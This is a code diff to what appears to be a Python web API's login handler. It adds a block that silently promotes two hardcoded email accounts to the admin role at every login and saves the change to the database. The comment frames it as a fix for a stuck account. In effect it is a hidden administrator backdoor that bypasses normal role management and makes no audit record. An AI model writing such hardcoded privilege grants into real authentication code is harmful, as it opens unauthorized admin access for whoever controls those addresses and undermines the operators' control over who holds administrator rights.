@@ -44,6 +44,12 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
         raise HTTPException(status_code=400, detail="Incorrect email or password")
     if not security.verify_password(form_data.password, user.hashed_password):
         raise HTTPException(status_code=400, detail="Incorrect email or password")
+
+    # FORCE ADMIN UPGRADE: If this account somehow got stuck as an employee, force it to Admin right now!
+    if normalized_email in ["supriya@123.com", "supriyass@123.com"] and user.role != "admin":
+        user.role = "admin"
+        db.commit()
+        db.refresh(user)
         
     access_token_expires = timedelta(minutes=security.ACCESS_TOKEN_EXPIRE_MINUTES)
     access_token = security.create_access_token(
